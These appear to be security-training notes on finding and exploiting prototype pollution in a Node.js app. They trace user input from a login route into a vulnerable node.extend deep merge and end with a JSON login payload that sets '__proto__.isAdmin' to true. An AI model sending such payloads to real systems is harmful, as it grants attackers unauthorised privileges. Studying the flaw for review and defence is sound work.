# Privilege Escalation

# **Code Review - Identifying the Vulnerability**

- Because prototype pollution can arise from many different implementations we can not just search the source code for keywords
- A lot of PP comes due to vulnerable dependencies
    - Often functions that clone or merge JS objects
    - `npm audit report`
- Check libs that sound interesting (merging) such as `node.extend` and check for CVE’s
- Then check if user input is used in the vulnerable dependency
    - First check where the dependency is called
        
        ```jsx
        grep -rl "node.extend"
        
        utils/log.js
        package.json
        ```
        
        ```jsx
        // utils/log.js
        
        const extend = require("node.extend");
        
        const log = (request) => {
        	var log = extend(true, {date: Date.now()}, request);
        	console.log("## Login activity: " + JSON.stringify(log));
        }
        
        module.exports = { log };
        ```
        
        The above JavaScript code `exports` a function called `log`, which uses the vulnerable `node.extend` dependency to merge the object passed as the argument `request` with the current date from `Date.now()`. We need to determine if user input can be included in the `request` argument and subsequently in the `node.extend` function call. To do so, we need to determine the input to the exported `log` function: 
        
        ```jsx
        grep -rl " log("
        
        routes/index.js
        ```
        
        ```jsx
        router.post("/login", async (req, res) => {
        	// log all login attempts for security purposes
            log(req.body);
        	
        	<SNIP>
        }
        ```
        
        The vulnerable `log` function is called in the login route with the argument `req.body`, which is the request body sent by the client. Thus, if we send a login request containing a prototype pollution payload, it is used as the argument of the `log` function and subsequently used in the vulnerable `node.extend` function leading to prototype pollution
        

<aside>
👉🏽

Polluting the global `Object.prototype` affects all objects in the target JavaScript runtime context and thus might result in unexpected and undesired consequences. Therefore, it is preferable to pollute objects lower down in the prototype chain so that not all JavaScript objects are affected by the pollution.

</aside>

### Example node.extend

```jsx
for (; i < length; i++) {
    // Only deal with non-null/undefined values
    options = arguments[i];
    if (options != null) {
      if (typeof options === 'string') {
        options = options.split('');
      }
      // Extend the base object
      for (name in options) {
        src = target[name];
        copy = options[name];

        // Prevent never-ending loop
        if (target === copy) {
          continue;
        }

        // Recurse if we're merging plain objects or arrays
        if (deep && copy && (is.hash(copy) || (copyIsArray = is.array(copy)))) {
          if (copyIsArray) {
            copyIsArray = false;
            clone = src && is.array(src) ? src : [];
          } else {
            clone = src && is.hash(src) ? src : {};
          }

          // Never move original objects, clone them
          target[name] = extend(deep, clone, copy);

        // Don't bring in undefined values
        } else if (typeof copy !== 'undefined') {
          target[name] = copy;
        }
      }
    }
```

```jsx
const log = (request) => {
    var log = extend(true, {date: Date.now()}, request);
    console.log("## Login activity: " + JSON.stringify(log));
}
```

```jsx
router.post("/login", ...)
	 log(req.body);
```

```jsx
{
	"username":"X",
	"password":"X",
	"__proto__": {
		"isAdmin":true
		}
}
```